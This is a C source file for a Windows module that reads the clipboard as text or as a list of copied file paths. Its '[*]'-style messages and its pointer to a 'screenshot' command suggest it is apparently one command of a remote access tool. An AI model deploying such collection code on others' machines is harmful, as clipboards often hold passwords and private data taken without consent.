#include "clipboard.h"
#include <stdio.h>
#include <string.h>
#include <shellapi.h>

/**
 * Module Clipboard
 *
 * Priorité des formats :
 *   1. CF_UNICODETEXT — texte unicode → UTF-8
 *   2. CF_TEXT        — texte ANSI (fallback)
 *   3. CF_HDROP       — fichiers copiés → liste des chemins
 *   4. CF_BITMAP/DIB  — image détectée, non extraite
 */

int clipboard_get(char *output, size_t size) {
    output[0] = '\0';

    if (!OpenClipboard(NULL)) {
        snprintf(output, size, "[-] clipboard: OpenClipboard failed (error %lu)\n",
                 GetLastError());
        return CLIPBOARD_ERROR_OPEN;
    }

    // ── 1. Texte Unicode ──────────────────────────────────────────────────────
    if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
        HANDLE h = GetClipboardData(CF_UNICODETEXT);
        if (h) {
            WCHAR *wstr = (WCHAR *)GlobalLock(h);
            if (wstr) {
                int hdr = snprintf(output, size, "[Clipboard - Text]\n");
                WideCharToMultiByte(CP_UTF8, 0, wstr, -1,
                                    output + hdr, (int)(size - hdr - 1),
                                    NULL, NULL);
                GlobalUnlock(h);
                CloseClipboard();
                return CLIPBOARD_SUCCESS;
            }
        }
    }

    // ── 2. Texte ANSI (fallback) ──────────────────────────────────────────────
    if (IsClipboardFormatAvailable(CF_TEXT)) {
        HANDLE h = GetClipboardData(CF_TEXT);
        if (h) {
            char *str = (char *)GlobalLock(h);
            if (str) {
                snprintf(output, size, "[Clipboard - Text]\n%.*s",
                         (int)(size - 20), str);
                GlobalUnlock(h);
                CloseClipboard();
                return CLIPBOARD_SUCCESS;
            }
        }
    }

    // ── 3. Fichiers copiés (CF_HDROP) ─────────────────────────────────────────
    if (IsClipboardFormatAvailable(CF_HDROP)) {
        HANDLE h = GetClipboardData(CF_HDROP);
        if (h) {
            HDROP hdrop = (HDROP)GlobalLock(h);
            if (hdrop) {
                UINT count = DragQueryFileA(hdrop, 0xFFFFFFFF, NULL, 0);
                int pos = snprintf(output, size,
                                   "[Clipboard - Files (%u file%s)]\n",
                                   count, count > 1 ? "s" : "");
                for (UINT i = 0; i < count && pos < (int)size - 2; i++) {
                    char filepath[MAX_PATH];
                    if (DragQueryFileA(hdrop, i, filepath, sizeof(filepath))) {
                        pos += snprintf(output + pos, size - pos,
                                        "  %s\n", filepath);
                    }
                }
                GlobalUnlock(h);
                CloseClipboard();
                return CLIPBOARD_SUCCESS;
            }
        }
    }

    // ── 4. Image ──────────────────────────────────────────────────────────────
    if (IsClipboardFormatAvailable(CF_BITMAP) ||
        IsClipboardFormatAvailable(CF_DIB)    ||
        IsClipboardFormatAvailable(CF_DIBV5)) {
        snprintf(output, size,
                 "[Clipboard - Image]\n"
                 "[*] Image detected in clipboard\n"
                 "[*] Use 'screenshot' to capture the screen instead\n");
        CloseClipboard();
        return CLIPBOARD_SUCCESS;
    }

    // ── Vide ou format non supporté ───────────────────────────────────────────
    snprintf(output, size, "[*] Clipboard is empty or contains an unsupported format\n");
    CloseClipboard();
    return CLIPBOARD_ERROR_EMPTY;
}
